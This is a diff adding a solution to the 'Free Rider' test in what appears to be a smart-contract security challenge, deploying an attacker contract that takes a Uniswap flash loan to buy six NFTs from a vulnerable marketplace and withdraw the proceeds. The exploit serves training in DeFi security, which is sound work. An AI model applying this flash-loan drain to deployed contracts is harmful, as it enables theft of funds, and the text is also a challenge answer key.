@@ -105,6 +105,25 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const fee = ethers.utils.parseEther('15').mul(31).div(10000); // flash loan fee
+        const expFac = await ethers.getContractFactory('FreeRiderBuyerExp', attacker);
+        const exp = await expFac.deploy(
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.nft.address,
+            this.weth.address,
+            {value: fee}
+        )
+        await exp.connect(attacker).initFlashloan(
+            ethers.utils.parseEther('15'),
+            {
+                repayAmount:ethers.utils.parseEther('15').add(fee),
+                tokenIds:[0, 1, 2, 3, 4, 5],
+                buyValue: ethers.utils.parseEther('15')
+            }
+        )
+        await exp.connect(attacker).withdraw();
     });
 
     after(async function () {
